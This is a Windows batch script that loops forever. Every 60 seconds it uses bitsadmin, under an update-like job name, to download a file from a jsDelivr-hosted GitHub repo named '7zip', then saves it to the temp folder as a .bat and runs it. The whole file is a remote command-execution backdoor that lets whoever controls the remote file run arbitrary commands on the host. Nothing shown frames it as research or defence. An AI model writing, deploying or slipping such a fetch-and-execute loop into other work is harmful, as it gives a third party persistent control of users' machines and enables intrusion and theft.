@echo off
setlocal enabledelayedexpansion

set "URL=https://cdn.jsdelivr.net/gh/anupcic/7zip@main/cmd.tmp"
set "DL=%TEMP%\cmd.txt"
set "RUN=%TEMP%\cmd.bat"

:loop
set "JOBNM=Upd_%RANDOM%"

del "%DL%" 2>nul
del "%RUN%" 2>nul

echo [%date% %time%] [*] Downloading...
bitsadmin /transfer "%JOBNM%" /download /priority normal "%URL%" "%DL%" >nul 2>&1
echo [%date% %time%] [BITS exit: %ERRORLEVEL%]

if not exist "%DL%" (
    echo [%date% %time%] [X] Download failed
    goto :wait
)

echo.
echo ---------- CONTENTS ----------
type "%DL%"
echo ------------------------------
echo.

copy /y "%DL%" "%RUN%" >nul

echo [%date% %time%] [*] Running as .bat...
echo.
call "%RUN%"
echo.
echo [%date% %time%] [*] Done. Exit code: %ERRORLEVEL%
echo.

:wait
echo [%date% %time%] Waiting 60 seconds...
timeout /t 60 /nobreak >nul
goto :loop